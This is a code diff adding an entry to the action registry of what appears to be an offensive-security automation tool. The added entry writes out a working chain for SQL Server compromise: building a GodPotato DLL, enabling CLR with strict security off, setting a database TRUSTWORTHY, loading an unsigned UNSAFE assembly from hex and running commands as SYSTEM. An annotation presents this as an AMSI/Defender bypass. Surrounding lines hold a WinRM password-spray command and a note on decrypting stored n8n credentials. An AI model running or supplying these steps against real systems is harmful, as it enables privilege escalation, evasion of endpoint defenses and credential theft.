@@ -595,6 +595,26 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False,
         note="LLM06 blast radius: the recovered key decrypts every stored n8n credential. The "
              "REST API masks values (__n8n_BLANK_VALUE), so decrypt straight from SQLite."),
+    "mssql_sqlclr_assembly_load": _a("mssql_sqlclr_assembly_load",
+        ["# build on Kali (Mono; a .NET4 DLL loads in SQL Server's CLR). class MUST be public,",
+         "# Main -> public static Run(string[]), + a [SqlProcedure] wrapper (UNIQUE dbg file/call):",
+         "mcs -unsafe -target:library -sdk:4.5 -r:System.Data.dll -out:/tmp/gp.dll $(find . -name '*.cs')",
+         "python3 -c \"print('0x'+open('/tmp/gp.dll','rb').read().hex())\" > /tmp/gph.txt",
+         "# then via impacket-mssqlclient 'sa:PASS@$IP' -file q.sql (ONE statement per line):",
+         "EXEC sp_configure 'show advanced options',1; RECONFIGURE;",
+         "EXEC sp_configure 'clr enabled',1; RECONFIGURE;",
+         "EXEC sp_configure 'clr strict security',0; RECONFIGURE;",
+         "ALTER DATABASE kethalis_deploy SET TRUSTWORTHY ON;",
+         "USE kethalis_deploy;",
+         "CREATE ASSEMBLY gp FROM 0x4d5a...<hex> WITH PERMISSION_SET = UNSAFE;",
+         "CREATE PROCEDURE dbo.GP @cmd nvarchar(4000) AS EXTERNAL NAME gp.[GodPotato.SqlEntry].GP;",
+         "EXEC dbo.GP N'cmd /c whoami > C:\\Users\\Public\\r.txt 2>&1';"],
+        risk="propose", runnable=False,
+        note="AMSI/Defender bypass: the assembly bytes never hit disk, AMSI, or a command line. "
+             "clr strict security=0 lets an unsigned UNSAFE asm load. Wrap SYSTEM commands in "
+             "'cmd /c'; the potato-spawned context is constrained (long/piped cmds fail 'Not enough "
+             "memory') so escalate to a real admin shell for heavy work. Payload = a potato (see "
+             "windows_potato_to_system)."),
     "netexec_winrm_spray": _a("netexec_winrm_spray",
         ["nxc winrm $IP -u users.txt -p passwords.txt --continue-on-success"],
         risk="propose", runnable=False, note="Needs vault-derived user/pass lists."),
